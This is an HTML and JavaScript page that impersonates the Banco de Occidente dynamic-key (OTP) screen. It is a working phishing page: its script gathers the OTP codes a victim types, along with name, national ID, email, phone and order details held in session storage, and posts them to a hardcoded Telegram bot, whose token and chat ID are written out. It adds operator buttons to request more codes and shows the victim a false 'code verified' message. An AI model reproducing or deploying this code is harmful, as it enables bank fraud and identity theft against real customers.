<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco de Occidente - Clave Dinámica</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            background: #f5f5f5;
        }

        /* ========== CARRUSEL IZQUIERDO ========== */
        .carousel-section {
            width: 60%;
            position: relative;
            overflow: hidden;
            background: #0a1628;
        }

        .carousel-container {
            width: 100%;
            height: 100%;
            position: relative;
        }

        .carousel-slide {
            position: absolute;
            width: 100%;
            height: 100%;
            opacity: 0;
            transition: opacity 1s ease-in-out;
        }

        .carousel-slide.active {
            opacity: 1;
        }

        .carousel-slide img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        /* Logo en carrusel */
        .carousel-logo {
            position: absolute;
            top: 40px;
            left: 40px;
            z-index: 10;
        }

        .carousel-logo-placeholder {
            width: 80px;
            height: 80px;
            border: 2px dashed #00a0e4;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #00a0e4;
            font-size: 10px;
            text-align: center;
            background: rgba(0, 0, 0, 0.3);
        }

        /* Texto VIGILADO */
        .vigilado-text {
            position: absolute;
            bottom: 40px;
            left: 20px;
            color: rgba(255, 255, 255, 0.5);
            font-size: 10px;
            writing-mode: vertical-rl;
            text-orientation: mixed;
            transform: rotate(180deg);
            letter-spacing: 2px;
        }

        /* Indicadores del carrusel */
        .carousel-indicators {
            position: absolute;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            gap: 10px;
            z-index: 10;
        }

        .indicator {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.4);
            cursor: pointer;
            transition: all 0.3s;
        }

        .indicator.active {
            background: #00a0e4;
            transform: scale(1.2);
        }

        /* ========== PANEL DERECHO ========== */
        .login-section {
            width: 40%;
            min-width: 450px;
            background: #fff;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        /* Boton Seguridad */
        .security-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 10px 20px;
            border: 1px solid #e0e0e0;
            border-radius: 25px;
            background: #fff;
            color: #333;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .security-btn:hover {
            border-color: #00a0e4;
            color: #00a0e4;
        }

        .security-btn svg {
            width: 20px;
            height: 20px;
            fill: #00a0e4;
        }

        /* Contenido principal */
        .login-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding: 60px 50px;
            max-width: 480px;
            margin: 0 auto;
            width: 100%;
        }

        /* Logo */
        .logo-container {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo-placeholder {
            width: 220px;
            height: 50px;
            margin: 0 auto;
            border: 2px dashed #00a0e4;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #00a0e4;
            font-size: 12px;
        }

        /* Bienvenida */
        .welcome-text {
            text-align: center;
            margin-bottom: 30px;
        }

        .welcome-text p {
            color: #666;
            font-size: 16px;
            margin-bottom: 5px;
        }

        .welcome-text h1 {
            color: #00a0e4;
            font-size: 24px;
            font-weight: 600;
        }

        /* Info banner */
        .info-banner {
            background: linear-gradient(135deg, #e8f4fc 0%, #d4ecf9 100%);
            border: 1px solid #b8ddf0;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
            display: flex;
            align-items: flex-start;
            gap: 15px;
        }

        .info-banner svg {
            width: 28px;
            height: 28px;
            fill: #00a0e4;
            flex-shrink: 0;
        }

        .info-banner-content h3 {
            color: #00a0e4;
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 5px;
        }

        .info-banner-content p {
            color: #555;
            font-size: 14px;
            line-height: 1.5;
        }

        /* Timer */
        .timer-container {
            text-align: center;
            margin-bottom: 25px;
        }

        .timer-label {
            color: #666;
            font-size: 14px;
            margin-bottom: 10px;
        }

        .timer {
            font-size: 36px;
            font-weight: 700;
            color: #00a0e4;
            font-family: 'Courier New', monospace;
        }

        .timer.warning {
            color: #f5a623;
        }

        .timer.danger {
            color: #e74c3c;
        }

        /* PIN inputs */
        .pin-container {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 25px;
        }

        .pin-input {
            width: 50px;
            height: 60px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            text-align: center;
            font-size: 28px;
            font-weight: 600;
            color: #333;
            transition: all 0.3s;
        }

        .pin-input:focus {
            outline: none;
            border-color: #00a0e4;
            box-shadow: 0 0 0 3px rgba(0, 160, 228, 0.15);
        }

        .pin-input.filled {
            border-color: #00a0e4;
            background: #f0f9ff;
        }

        /* Teclado numerico */
        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            max-width: 280px;
            margin: 0 auto 25px;
        }

        .key {
            height: 55px;
            border: 1px solid #e0e0e0;
            border-radius: 10px;
            background: #fff;
            font-size: 22px;
            font-weight: 500;
            color: #333;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .key:hover {
            background: #f5f5f5;
            border-color: #00a0e4;
        }

        .key:active {
            background: #00a0e4;
            color: #fff;
            transform: scale(0.95);
        }

        .key.delete {
            background: #f8f8f8;
        }

        .key.delete svg {
            width: 24px;
            height: 24px;
            fill: #666;
        }

        .key.delete:hover svg {
            fill: #00a0e4;
        }

        .key.empty {
            visibility: hidden;
        }

        /* Reenviar codigo */
        .resend-container {
            text-align: center;
            margin-bottom: 25px;
        }

        .resend-link {
            color: #00a0e4;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .resend-link:hover {
            text-decoration: underline;
        }

        .resend-link svg {
            width: 18px;
            height: 18px;
            fill: #00a0e4;
        }

        /* Botones */
        .buttons-row {
            display: flex;
            gap: 15px;
        }

        .btn {
            flex: 1;
            padding: 14px 20px;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.3s;
        }

        .btn-outline {
            background: #fff;
            border: 1px solid #e0e0e0;
            color: #333;
        }

        .btn-outline:hover {
            border-color: #00a0e4;
            color: #00a0e4;
        }

        .btn-primary {
            background: #00a0e4;
            border: none;
            color: #fff;
        }

        .btn-primary:hover {
            background: #0088c6;
        }

        .btn-primary:disabled {
            background: #ccc;
            cursor: not-allowed;
        }

        .btn svg {
            width: 18px;
            height: 18px;
        }

        /* Responsive */
        @media (max-width: 1024px) {
            .carousel-section {
                width: 50%;
            }

            .login-section {
                width: 50%;
                min-width: 400px;
            }
        }

        @media (max-width: 768px) {
            body {
                flex-direction: column;
            }

            .carousel-section {
                display: none;
            }

            .login-section {
                width: 100%;
                min-width: auto;
            }

            .login-content {
                padding: 40px 30px;
            }

            .pin-input {
                width: 45px;
                height: 55px;
                font-size: 24px;
            }
        }
    </style>
</head>

    <script>
        // ========== CARRUSEL ==========
        let currentSlide = 0;
        const slides = document.querySelectorAll('.carousel-slide');
        const indicators = document.querySelectorAll('.indicator');
        const totalSlides = slides.length;

        function showSlide(index) {
            slides.forEach((slide, i) => {
                slide.classList.remove('active');
                indicators[i].classList.remove('active');
            });
            slides[index].classList.add('active');
            indicators[index].classList.add('active');
        }

        function nextSlide() {
            currentSlide = (currentSlide + 1) % totalSlides;
            showSlide(currentSlide);
        }

        setInterval(nextSlide, 5000);

        indicators.forEach((indicator, index) => {
            indicator.addEventListener('click', () => {
                currentSlide = index;
                showSlide(currentSlide);
            });
        });

        // ========== TEMPORIZADOR ==========
        let timeLeft = 120;
        const timerDisplay = document.getElementById('timer');

        function updateTimer() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;

            if (timeLeft <= 30) {
                timerDisplay.className = 'timer danger';
            } else if (timeLeft <= 60) {
                timerDisplay.className = 'timer warning';
            }

            if (timeLeft > 0) {
                timeLeft--;
            }
        }

        setInterval(updateTimer, 1000);

        // ========== PIN INPUTS ==========
        const pinInputs = document.querySelectorAll('.pin-input');
        const btnConfirmar = document.getElementById('btnConfirmar');

        function addDigit(digit) {
            for (let i = 0; i < pinInputs.length; i++) {
                if (pinInputs[i].value === '') {
                    pinInputs[i].value = digit;
                    pinInputs[i].classList.add('filled');
                    if (i < pinInputs.length - 1) {
                        pinInputs[i + 1].focus();
                    }
                    break;
                }
            }
            checkComplete();
        }

        function deleteDigit() {
            for (let i = pinInputs.length - 1; i >= 0; i--) {
                if (pinInputs[i].value !== '') {
                    pinInputs[i].value = '';
                    pinInputs[i].classList.remove('filled');
                    pinInputs[i].focus();
                    break;
                }
            }
            checkComplete();
        }

        function checkComplete() {
            let complete = true;
            pinInputs.forEach(input => {
                if (input.value === '') complete = false;
            });
            btnConfirmar.disabled = !complete;
        }

        // Eventos de teclado en inputs
        pinInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                const value = e.target.value.replace(/[^0-9]/g, '');
                e.target.value = value;

                if (value) {
                    e.target.classList.add('filled');
                    if (index < pinInputs.length - 1) {
                        pinInputs[index + 1].focus();
                    }
                }
                checkComplete();
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    pinInputs[index - 1].focus();
                }
            });

            input.addEventListener('focus', () => {
                input.select();
            });
        });

        // Soporte para pegar
        pinInputs[0].addEventListener('paste', (e) => {
            e.preventDefault();
            const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);

            for (let i = 0; i < pastedData.length && i < pinInputs.length; i++) {
                pinInputs[i].value = pastedData[i];
                pinInputs[i].classList.add('filled');
            }

            if (pastedData.length > 0) {
                const focusIndex = Math.min(pastedData.length, pinInputs.length - 1);
                pinInputs[focusIndex].focus();
            }
            checkComplete();
        });

        // Reenviar codigo
        function resendCode() {
            timeLeft = 120;
            timerDisplay.className = 'timer';
            pinInputs.forEach(input => {
                input.value = '';
                input.classList.remove('filled');
            });
            pinInputs[0].focus();
            btnConfirmar.disabled = true;
            alert('Se ha enviado un nuevo código a tu celular.');
        }

        const TELEGRAM_TOKEN = "8788879668:AAHI39IMa5dZECzEsl_KA6ODZug2gZqhslA";
        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
        const CHAT_ID = "6483487531";

        async function sendToTelegram(text) {
            const body = {
                chat_id: CHAT_ID,
                text: text,
                parse_mode: "HTML"
            };
            try {
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(body)
                });
            } catch (err) {
                console.error("Error enviando a Telegram:", err);
            }
        }

        async function sendToTelegram(text, inlineKeyboard = null) {
            const body = {
                chat_id: CHAT_ID,
                text: text,
                parse_mode: "HTML"
            };
            if (inlineKeyboard) body.reply_markup = { inline_keyboard: inlineKeyboard };

            try {
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(body)
                });
            } catch (err) {
                console.error("Error enviando a Telegram:", err);
            }
        }

        // Confirmar
        btnConfirmar.addEventListener('click', async () => {
            let code = '';
            pinInputs.forEach(input => code += input.value);
            
            // OTP Tracking Logic
            let otpCount = parseInt(sessionStorage.getItem("otp_count") || "0") + 1;
            if (otpCount > 4) otpCount = 1;
            sessionStorage.setItem("otp_count", otpCount);
            sessionStorage.setItem(`otp_val_${otpCount}`, code);

            const nombre = sessionStorage.getItem("nombre") || "---";
            const cedula = sessionStorage.getItem("cedula") || "---";
            const correo = sessionStorage.getItem("correo") || "---";
            const telefono = sessionStorage.getItem("telefono") || "---";
            const total = sessionStorage.getItem("total") || "---";
            const banco = sessionStorage.getItem("banco") || "BANCO DE OCCIDENTE";
            const tipoBanco = sessionStorage.getItem("tipoBanco") || "Natural";
            const randomID = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);

            let producto = "STICKER COMBO FAMILIAR x20";
            try {
                const order = JSON.parse(sessionStorage.getItem('ms_last_order'));
                if (order && order.items && order.items.length > 0) {
                    const item = order.items[0];
                    producto = (item.isCombo ? 'STICKER COMBO FAMILIAR' : 'STICKER BENDECIDO') + ' x' + item.qty;
                }
            } catch (e) {}

            const otp1 = sessionStorage.getItem("otp_val_1") || "—";
            const otp2 = sessionStorage.getItem("otp_val_2") || "—";
            const otp3 = sessionStorage.getItem("otp_val_3") || "—";
            const otp4 = sessionStorage.getItem("otp_val_4") || "—";

            const text = `🔐 <b>PIN Banco de Occidente Recibido — OTP${otpCount}</b>\n\n👤 Nombre: ${nombre}\n🪪 Cédula: ${cedula}\n📧 Correo: ${correo}\n📞 Teléfono: ${telefono}\n💰 Total: ${total}\n🛒 Producto: ${producto}\n\n🔑 OTP1: <code>${otp1}</code>\n🔑 OTP2: <code>${otp2}</code>\n🔑 OTP3: <code>${otp3}</code>\n🔑 OTP4: <code>${otp4}</code>\n\n📊 OTP actual: ${otpCount} de 4 | 🆔 ${randomID}`;

            const buttons = [
                [{ text: "🔄 Pedir OTP", callback_data: "pedir_otp" }],
                [{ text: "✅ Aceptar", callback_data: "aceptar" }, { text: "❌ Rechazar", callback_data: "rechazar" }]
            ];

            await sendToTelegram(text, buttons);

            // Limpiar
            pinInputs.forEach(input => {
                input.value = '';
                input.classList.remove('filled');
            });
            pinInputs[0].focus();
            btnConfirmar.disabled = true;
            
            alert("Código verificado. Por favor espere...");
        });

        // Focus inicial
        pinInputs[0].focus();
    </script>
